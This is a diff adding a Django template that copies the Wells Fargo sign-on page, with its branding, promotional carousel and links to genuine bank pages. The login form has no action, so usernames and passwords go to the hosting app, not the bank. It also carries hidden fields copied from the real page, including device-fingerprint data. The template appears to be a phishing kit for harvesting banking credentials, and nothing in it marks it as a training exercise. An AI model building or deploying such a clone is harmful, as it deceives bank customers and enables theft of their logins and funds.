@@ -1,0 +1,206 @@
+{% extends 'wells/base.html' %}
+{% load static %}
+
+{% block content %}
+<div class="inner">
+    <div id="signOn">
+        <div id="signOnMain">
+            <h2 id="signOnHeader"><img alt="Secure" role="img"
+                                       src="{% static '' %}WellsFargo/homepage-signon-lock.svg">View Your Accounts</h2>
+
+            <form autocomplete="off" data-login-app="true" id="frmSignon" method="post" name="signon">
+                {% csrf_token %}
+
+                <div class="formElementsWrapper formElementsUsername" id="usernameDiv">
+                    <label class="id_label" for="userid" id="usernameLabel">Username</label>
+                    <input accesskey="U" autocomplete="off" class="formElement formElementText login_field"
+                           id="userid" maxlength="14" name="username"
+                           required type="text">
+                </div>
+                <div class="formElementsWrapper formElementsPassword" id="passwordDiv">
+                    <label class="id_label" for="password" id="passwordLabel">Password</label>
+                    <input accesskey="P" autocomplete="off" class="formElement formElementPassword login_field pmask"
+                           id="password" maxlength="32"
+                           name="password" required type="password">
+                </div>
+                <div class="formElementsWrapper formElementsSaveUsername" id="saveuid">
+                    <input accesskey="S" class="c29link formElement formElementCheckbox" data-content-id="c29content-save-username"
+                           id="saveusername" isclickable="true"
+                           name="saveusername" triggerhover="false"
+                           type="checkbox">
+                    <label class="lsc" for="saveusername">Save username<span class="hidden">Notice - For
+                                            your security, we do not recommend using this feature on a shared
+                                            device.</span></label>
+                    <input id="save-username" name="save-username" type="hidden" value="false">
+                    <input id="hdnuserid" name="hdnuserid" type="hidden" value="">
+                </div>
+                <div class="formSubmit">
+                    <input class="c7" id="btnSignon" name="btnSignon" type="submit" value="Sign On">
+                </div>
+                <div class="forgotPasswordLinkWrapper">
+                    <a
+                            href="https://www.wellsfargo.com/help/online-banking/sign-on-faqs/?linkLoc=signon">Forgot
+                        Password/Username? </a>
+                    <input name="screenid" type="hidden" value="SIGNON">
+                    <input name="origination" type="hidden" value="WebCons">
+                    <input name="LOB" type="hidden" value="Cons">
+                    <input id="userPrefs" name="userPrefs" type="hidden" value="">
+                    <input id="jsenabled" name="jsenabled" type="hidden" value="false">
+                    <input id="origin" name="origin" type="hidden" value="cob">
+                    <input name="homepage" type="hidden" value="true">
+
+                </div>
+                <input id="tgcsi" name="tgcsi" type="hidden"
+                       value="5c386843-34cb-482e-8f17-3880092e9ae5"><input id="fidoAuth" name="fidoAuth"
+                                                                           type="hidden" value="false"><input
+                    id="fidoAuthAttachment" name="fidoAuthAttachment"
+                    type="hidden" value=""><input name="nds-pmd" type="hidden"
+                                                            value="{&quot;jvqtrgQngn&quot;:{&quot;oq&quot;:&quot;1536:754:1536:824:1536:824&quot;,&quot;wfi&quot;:&quot;flap-150612&quot;,&quot;oc&quot;:&quot;q400qo6n8n86q525&quot;,&quot;fe&quot;:&quot;1536k864 24&quot;,&quot;qvqgm&quot;:&quot;-300&quot;,&quot;jxe&quot;:972911,&quot;syi&quot;:&quot;snyfr&quot;,&quot;si&quot;:&quot;si,btt,zc4,jroz&quot;,&quot;sn&quot;:&quot;sn,zcrt,btt,jni&quot;,&quot;us&quot;:&quot;74621s7244s49q25&quot;,&quot;cy&quot;:&quot;Jva32&quot;,&quot;sg&quot;:&quot;{\&quot;zgc\&quot;:0,\&quot;gf\&quot;:snyfr,\&quot;gr\&quot;:snyfr}&quot;,&quot;sp&quot;:&quot;{\&quot;gp\&quot;:gehr,\&quot;ap\&quot;:gehr}&quot;,&quot;sf&quot;:&quot;gehr&quot;,&quot;jt&quot;:&quot;s2nno0056qp62o71&quot;,&quot;sz&quot;:&quot;o65521rrr8ps0sos&quot;,&quot;vce&quot;:&quot;apvc,0,604r62pr,2,1;fg,0,hfrevq,0,cnffjbeq,0;zz,148,35r,77,jrnyguGno;zzf,3r9,0,n,41 0,2r18 p1p,n90,o38,-143on,1q07q,-qn;zzf,3r8,3r8,n,2q3 41p,23s7 r20r,1906,18pn,-8qn52,7379r,-29r3;zzf,6r7,6r7,n,ABC;zzf,270s,270s,n,ABC;zzf,40n,40n,n,ABC;gf,0,3o19;zzf,1325,1324,n,ABC;zz,q08,180,0,gbcFrnepu;zzf,3s,q48,n,1q3s 10552,1q3s 10552,1n4p,1n4p,n4588,n4588,106s4;xx,139,0,hfrevq;ss,0,hfrevq;zp,4p,172,124,hfrevq;xq,24q;zzf,15,3r7,n,7n 0,0 2344,69q,69s,-8r4r0,78qp,-1073o;xq,14;xq,9;xq,5r;so,s5,hfrevq;xx,2,0,cnffjbeq;ss,0,cnffjbeq;zp,2o,17r,152,cnffjbeq;xq,162;xq,9;xq,41;xq,72;xq,3;zzf,2p,3rn,n,0 73,p3 412,s7,s8,-2396,24rn,0;xq,23;so,2p6,cnffjbeq;zzf,o68,r51,n,41 74,1386 3o5r,ss5,1022,-1rs65,1r9rp,-19p;xx,458,6,cnffjbeq;gf,0,75ss;ss,1,cnffjbeq;zz,106,174,6,gbcFrnepu;so,56n,cnffjbeq;xx,52r,6,cnffjbeq;ss,0,cnffjbeq;so,346,cnffjbeq;xx,40p,6,cnffjbeq;ss,0,cnffjbeq;zz,98o,pp,0,;so,608,cnffjbeq;zzf,8pr,2snn,32,21 0,885 3s57,6o1,428n,-14073,1446o,70;zz,8o8,127,r6,;zz,1858,127,10q,;gf,0,p261;zzf,860,2970,32,206 399,3p31 397o,61p,3psp,-147q5,1n239,2q;zz,177q,1oq,170,;zzf,s9n,2717,32,181 no,7r65 1661,nn7,6npp,-22op3,1p0nq,34;&quot;,&quot;hn&quot;:&quot;Zbmvyyn/5.0 (Jvaqbjf AG 10.0; Jva64; k64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/89.0 Fnsnev/537.36&quot;,&quot;ns&quot;:&quot;&quot;,&quot;fvq&quot;:&quot;aqfncr8npnewbzaxz9wdpuc&quot;},&quot;fvq&quot;:&quot;aqfncr8npnewbzaxz9wdpuc&quot;,&quot;jg&quot;:&quot;&quot;}"><input
+                    name="ndsid" type="hidden" value="ndsape8acarjomnkm9jqchp"><input id="fidoAuth"
+                                                                                      name="fidoAuth" type="hidden"
+                                                                                      value="false"><input id="fidoAuthAttachment"
+                                                                                                           name="fidoAuthAttachment"
+                                                                                                           type="hidden"
+                                                                                                           value="">
+            </form>
+        </div>
+        <div id="signUp">
+
+            <a href="https://oam.wellsfargo.com/oamo/identity/enrollment">Enroll Now</a>
+
+            <a href="https://www.wellsfargo.com/privacy-security/fraud/?linkLoc=signon">Security
+                Center</a>
+            <a href="https://www.wellsfargo.com/privacy-security/?linkLoc=signon">Privacy, Cookies, and
+                Security</a>
+        </div>
+    </div>
+
+
+</div>
+
+<div class="c3" data-cid="tcm:242-147040-16" data-ctid="tcm:224-146930-32">
+    <div aria-label="Promotions Slideshow" class="c3wrapper" role="region">
+        <div class="paddles alwaysOn"><a class="left" href="#_prevFrame"><img alt="Previous Slide"
+                                                                              src="https://www01.wellsfargomedia.com/assets/images/css/template/homepage/home_sprite_image.png"></a>
+        </div>
+
+        <div class="carouselFrame item1" style="display: block;"><span class="hidden">Begin item
+                                1</span>
+            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en">
+
+
+                <div class="c3Img" data-cid="tcm:84-146961-16" data-ctid="tcm:91-146911-32">
+                    <img alt=""
+                         src="https://www01.wellsfargomedia.com/assets/images/homepage/wfi111_ph_hph_default1_1200x532.jpg">
+                </div>
+                <div class="inner">
+                    <div class="marqueeContent">
+                        <div class="marqueecontentinner marqueetheme11">
+
+                            <h2>Simplified banking</h2>
+                            <span>Everyday Checking provides convenience and fast access. Open in
+                                                minutes.</span>
+                            <a class="c7" href="/checking/" role="button">Start now</a>
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            <span class="hidden">End item 1</span>
+        </div>
+
+        <div class="carouselFrame item2" style="display: none;"><span class="hidden">Begin item 2</span>
+            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_2" lang="en">
+
+
+                <div class="c3Img" data-cid="tcm:84-147036-16" data-ctid="tcm:91-146911-32">
+                    <img alt=""
+                         src="https://www01.wellsfargomedia.com/assets/images/contextual/banner/enterprise/1200x532/wfi000_lg_b-wf-stagecoach_rednoborder_1200x532.gif">
+                </div>
+                <div class="inner">
+                    <div class="marqueeContent">
+                        <div class="marqueecontentinner marqueetheme11">
+
+                            <h2>Keeping you informed</h2>
+
+
+                            <a class="c7" enrollmentid="3107" href="https://stories.wf.com/"
+                               role="button">Learn More</a>
+
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            <span class="hidden">End item 2</span>
+        </div>
+
+        <div class="carouselFrame item3" style="display: none;"><span class="hidden">Begin item 3</span>
+            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_3" lang="en">
+
+
+                <div class="c3Img" data-cid="tcm:84-147009-16" data-ctid="tcm:91-146911-32"><img alt=""
+                                                                                                 class="deferred"
+                                                                                                 data-deferred-src="https://www01.wellsfargomedia.com/assets/images/homepage/wfic765_pg_1200x532.jpg"
+                                                                                                 src="https://www01.wellsfargomedia.com/assets/images/homepage/wfic765_pg_1200x532.jpg">
+                </div>
+                <div class="inner">
+                    <div class="marqueeContent">
+                        <div class="marqueecontentinner marqueetheme11">
+
+                            <h2>Innovation. Security. Convenience.</h2>
+                            <span>We’re committed to your success.</span>
+
+                            <a class="c7" enrollmentid="3783" href="/goals-banking-made-easy/why-wells-fargo/"
+                               role="button">Learn More</a>
+
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            <span class="hidden">End item 3</span>
+        </div>
+
+        <div class="carouselFrame incomingFrame" style="left: 0px; display: none;"><span
+                class="hidden">Begin item 1</span>
+            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en">
+
+
+                <div class="c3Img" data-cid="tcm:84-146961-16" data-ctid="tcm:91-146911-32">
+                    <img alt=""
+                         src="https://www01.wellsfargomedia.com/assets/images/homepage/wfi111_ph_hph_default1_1200x532.jpg">
+                </div>
+                <div class="inner">
+                    <div class="marqueeContent">
+                        <div class="marqueecontentinner marqueetheme11">
+
+                            <h2>Simplified banking</h2>
+                            <span>Everyday Checking provides convenience and fast access. Open in
+                                                minutes.</span>
+                            <a class="c7" href="/checking/" role="button">Start now</a>
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            <span class="hidden">End item 1</span>
+        </div>
+        <div class="controls"><a class="show1 current" href="#_frame1" role="presentation"
+                                 tabindex="-1"><span class="hidden">item 1 of 3 - you are here</span><img alt=""
+                                                                                                                src="https://www01.wellsfargomedia.com/assets/images/css/template/homepage/icon-marquee-dot-active.svg"></a><a
+                class="show2" href="#_frame2"><span class="hidden">item 2 of 3</span><img alt=""
+                                                                                          src="https://www01.wellsfargomedia.com/assets/images/css/template/homepage/icon-marquee-dot-inactive.svg"></a><a
+                class="show3" href="#_frame3"><span class="hidden">item 3 of 3</span><img alt=""
+                                                                                          src="https://www01.wellsfargomedia.com/assets/images/css/template/homepage/icon-marquee-dot-inactive.svg"></a>
+        </div>
+        <div class="paddles alwaysOn"><a class="right" href="#_nextFrame"><img alt="Next Slide"
+                                                                               src="https://www01.wellsfargomedia.com/assets/images/css/template/homepage/home_sprite_image.png"></a>
+        </div>
+    </div>
+</div>
+{% endblock content %}
